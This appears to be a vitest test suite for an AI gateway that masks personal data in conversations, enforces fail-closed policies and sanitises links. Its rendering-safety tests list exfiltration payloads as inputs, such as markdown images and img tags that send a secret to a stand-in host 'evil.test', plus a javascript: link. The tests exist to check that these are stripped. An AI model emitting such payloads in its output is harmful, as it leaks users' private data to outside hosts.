import { afterEach, describe, expect, it } from 'vitest';
import { writeFileSync } from 'node:fs';
import { ConversationVault, mergeSpans } from '../src/vault.js';
import { strictest } from '../src/policy.js';
import { sanitiseLinks } from '../src/sanitise.js';
import { employee, harness, policyText } from './helpers.js';

const disposers: (() => void)[] = [];
afterEach(() => { disposers.splice(0).forEach(fn => fn()); });
describe('vault', () => {
  it('expires values and history at the conversation TTL', () => {
    let now = 1000;
    const v = new ConversationVault(100, () => now); disposers.push(() => v.close());
    const lock = v.acquire('asha'); lock.release();
    v.mask(lock.id, 'asha', '123', [{ start: 0, end: 3, category: 'PHONE' }] as never);
    now = 1101;
    expect(() => v.history(lock.id, 'asha')).toThrow('CONVERSATION_NOT_FOUND');
  });
  it('serializes concurrent turns in the same conversation', () => {
    const v = new ConversationVault(); disposers.push(() => v.close());
    const lock = v.acquire('asha');
    expect(() => v.acquire('asha', lock.id)).toThrow('CONVERSATION_BUSY');
    lock.release(); expect(v.acquire('asha', lock.id).id).toBe(lock.id);
  });
  it('restores exact minted tokens only, without recursive substitution', () => {
    const v = new ConversationVault(); disposers.push(() => v.close());
    const lock = v.acquire('asha');
    const token = v.mask(lock.id, 'asha', 'private', [{ start: 0, end: 7, category: 'PHONE' }] as never);
    expect(token).toMatch(/^\[PHONE_[a-f0-9]{32}\]$/);
    expect(v.restore(lock.id, 'asha', token)).toBe('private');
    expect(v.restore(lock.id, 'asha', token.toUpperCase())).not.toBe('private');
    expect(v.restore(lock.id, 'asha', '[PHONE_00000000000000000000000000000000]')).not.toBe('private');
    lock.release();
  });
  it('merges overlapping findings so no suffix remains unmasked', () => {
    expect(mergeSpans([{ start: 0, end: 5, category: 'PHONE' }, { start: 3, end: 9, category: 'CARD' }])).toEqual([{ start: 0, end: 9, category: 'PHONE' }]);
  });
  it('refuses to exceed the conversation capacity', () => {
    const v = new ConversationVault(10000, Date.now, 1); disposers.push(() => v.close());
    v.acquire('asha').release(); expect(() => v.acquire('ravi')).toThrow('VAULT_CAPACITY');
  });
});
describe('policy safety', () => {
  it('fails closed after invalid YAML and recovers only with a valid policy', async () => {
    const h = harness(); disposers.push(h.close);
    writeFileSync(h.path, 'not: [valid'); h.policies.reload();
    await expect(h.gateway.run(employee, { messages: [{ role: 'user', content: 'hello' }] })).rejects.toMatchObject({ code: 'POLICY_UNAVAILABLE' });
    expect(h.provider.complete).not.toHaveBeenCalled();
    writeFileSync(h.path, policyText.replace('version: "1"', 'version: "2"')); h.policies.reload();
    expect(h.policies.snapshot().version).toBe('2');
  });
  it('rejects an unversioned change and a policy that allows secrets', () => {
    const h = harness(); disposers.push(h.close);
    writeFileSync(h.path, policyText.replace('pii: mask', 'pii: block')); h.policies.reload();
    expect(() => h.policies.snapshot()).toThrow('POLICY_UNAVAILABLE');
    writeFileSync(h.path, policyText.replace('secret: block', 'secret: allow').replace('version: "1"', 'version: "2"')); h.policies.reload();
    expect(() => h.policies.snapshot()).toThrow('POLICY_UNAVAILABLE');
  });
  it('applies strictest action independently of detector order', () => {
    expect(strictest(['warn', 'mask', 'block', 'allow'])).toBe('block');
    expect(strictest(['mask', 'deny'])).toBe('deny');
  });
});
describe('post-restoration rendering safety', () => {
  it.each([
    '![x](https://evil.test/?d=secret)',
    '<img src="https://evil.test/?d=secret">',
    '[x](javascript:alert(secret))',
    '[x](//evil.test/?d=secret)',
    'https://evil.test/?d=secret',
    'https://trusted.test.evil.test/?d=secret',
  ])('removes unsafe remote content: %s', text => {
    const safe = sanitiseLinks(text, ['trusted.test']);
    expect(safe).not.toContain('evil.test'); expect(safe).not.toContain('javascript:'); expect(safe).not.toContain('<img');
  });
  it('allows only the origin of an explicitly approved HTTPS host', () => {
    expect(sanitiseLinks('https://trusted.test/path/secret?d=secret#secret', ['trusted.test'])).toBe('https://trusted.test');
    expect(sanitiseLinks('https://secret@trusted.test/', ['trusted.test'])).toBe('[link removed]');
  });
});
